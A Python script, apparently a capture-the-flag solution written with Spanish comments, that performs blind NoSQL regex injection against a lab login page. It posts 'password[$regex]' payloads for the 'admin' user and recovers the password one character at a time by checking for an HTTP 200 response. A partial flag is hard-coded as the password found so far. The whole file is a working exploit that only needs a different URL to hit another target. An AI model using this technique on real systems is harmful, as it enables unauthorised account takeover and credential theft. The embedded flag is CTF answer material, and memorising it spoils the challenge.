import requests
import string

url = "https://f052d0cc5803-webth-vulnerable.numa.host/login"  # Reemplaza con la URL real
password = "URJC{4ut0m4t1z4l0_0_sufr3_l4s_c0ns3cu3nc14s.3n_s3r10.N0_l0_h4ga5_A_m4n0.3n_un_lug4r_d3_j4ck3rl4nd1a_cuyo_n0mbre_NO_t3ng0_3n_c4che.v1vi4_un_ju4k3rit0_d3_b0ton_g0rdO"
characters = "}{abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_."
#characters = list(string.ascii_letters) + list(string.digits) + list(string.punctuation) + list(string.whitespace)
#characters = "1234567890"
#characters = "*s"

while True:
    found = False
    for char in characters:
        test_password = f"^{password}{char}.*"
        data = {
            "username": "admin",
            "password[$regex]": test_password  # Ajuste para que use parámetros codificados
        }
        # Enviar datos como x-www-form-urlencoded
        response = requests.post(url, data=data)
        
        print(f"Probing with: {test_password}")
        print(f"Status code: {response.status_code}")

        if response.status_code == 200:  # Cambia esto según cómo responde tu servidor
            password += char
            print(f"[+] Password so far: {password}")
            found = True
            break

    if not found:  # Si no encontramos más caracter válidos, la contraseña está completa
        print(f"[!] Password completo: {password}")
        break

